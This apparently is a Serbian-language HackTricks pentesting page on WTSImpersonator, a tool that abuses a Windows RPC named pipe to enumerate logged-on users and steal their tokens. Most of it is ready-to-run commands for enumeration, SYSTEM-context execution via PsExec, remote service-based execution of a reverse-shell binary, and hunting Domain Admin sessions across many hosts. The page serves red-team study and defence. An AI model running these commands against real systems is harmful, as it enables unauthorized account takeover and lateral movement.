# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Alat **WTS Impersonator** iskorišćava RPC imenovani kanal **"\\pipe\LSM_API_service"** za prikriveno nabrajanje prijavljenih korisnika i preuzimanje njihovih tokena, zaobilazeći tradicionalne tehnike Token Impersonation. Ovaj pristup omogućava neometano lateralno kretanje unutar mreža. Zasluge za inovaciju koja stoji iza ove tehnike pripadaju **Omriju Basu, čiji je rad dostupan na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>

### Osnovna funkcionalnost

Alat funkcioniše kroz niz API poziva:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ključni moduli i upotreba

- **Enumerating Users**: Lokalna i udaljena enumeracija korisnika moguća je pomoću alata, uz korišćenje komandi za oba scenarija:

- Lokalno:
```bash
.\WTSImpersonator.exe -m enum
```
- Udaljeno, navođenjem IP adrese ili hostname-a:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: Moduli `exec` i `exec-remote` zahtevaju **Service** kontekst za rad. Za lokalno izvršavanje potrebni su samo WTSImpersonator executable i komanda:

- Primer lokalnog izvršavanja komande:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe može se koristiti za dobijanje Service konteksta:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: Podrazumeva kreiranje i instaliranje servisa na udaljenom sistemu, slično kao kod PsExec.exe, čime se omogućava izvršavanje sa odgovarajućim dozvolama.

- Primer udaljenog izvršavanja:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: Cilja određene korisnike na više mašina i izvršava kod pod njihovim credentialima. Ovo je naročito korisno za ciljanje Domain Admins korisnika sa lokalnim admin pravima na više sistema.
- Primer upotrebe:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Reference

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
